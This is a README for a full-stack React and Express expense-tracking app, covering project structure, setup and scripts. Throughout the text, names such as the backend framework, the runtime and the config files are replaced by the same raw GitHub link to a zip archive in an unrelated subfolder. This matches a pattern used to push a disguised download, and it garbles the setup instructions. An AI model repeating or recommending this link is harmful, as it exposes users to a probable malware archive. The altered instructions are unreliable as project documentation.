# Personal Expense Tracker

Personal Expense Tracker is a full-stack project with a **React frontend** and a **https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip backend**. It uses **npm workspaces** to manage dependencies for both frontend and backend from the root directory. The project allows users to track expenses and income, manage categories, upload/download receipts, view monthly summaries and budget alerts, and authenticate via JWT.

## Project Structure

personal-expense-tracker/
├─ frontend/      # React frontend (Vite, TypeScript, TailwindCSS)
├─ backend/       # Express backend (https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip, PostgreSQL, Sequelize)
├─ https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip   # Root https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip (workspaces + dev scripts)
└─ .gitignore


## Prerequisites

- https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip >= 18
- npm >= 9
- PostgreSQL (for backend database)

## Setup

1. **Install all dependencies** (root + frontend + backend):

npm install

2. **Backend setup**:

* Create a PostgreSQL database with any name you like (e.g., `expense_tracker`). Make sure the database name in your `.env` file matches the name you created.
* Copy the `https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip` file from the `backend/` folder to `.env` and update it with your database credentials.
* Run migrations:

cd backend
npm run db:migrate

* (Optional) Seed demo data:

npm run db:seed

3. **Frontend setup**:

* Dependencies are already installed via npm workspaces; no additional setup required

## Running the Project

* **Run both frontend and backend simultaneously**:

npm run dev:all

* **Run frontend only**:

npm run dev --workspace frontend

* **Run backend only**:

npm run dev --workspace backend

> Note: `dev:all` uses `concurrently` to launch both servers in the same terminal.

## Backend Details

* **Framework:** https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip
* **Database:** PostgreSQL with Sequelize ORM
* **Dev Tools:** nodemon, sequelize-cli
* **Key Scripts:**

  * `npm run dev` → start server in dev mode
  * `npm run db:migrate` → run database migrations
  * `npm run db:seed` → seed demo data

## Frontend Details

* **Framework:** React (Vite + TypeScript)
* **Styling:** TailwindCSS, styled-components
* **Libraries:** axios, framer-motion, recharts, react-router-dom, lucide-react
* **Dev Tools:** vite, eslint, autoprefixer, postcss

## Repository

* GitHub: [Personal-Expense-Tracker](https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip)

## Notes

* The root `https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip` manages **workspaces** and **dev scripts**.
* Each workspace (`frontend` and `backend`) has its own `https://raw.githubusercontent.com/Miahy03/Personal-Expense-Tracker/main/maximite/Personal-Expense-Tracker.zip`.
* `.gitignore` should be set up in each workspace and in the root to ignore `node_modules`, `.env`, and other temporary files.
* the template for `.env` are dispo for frontend or backend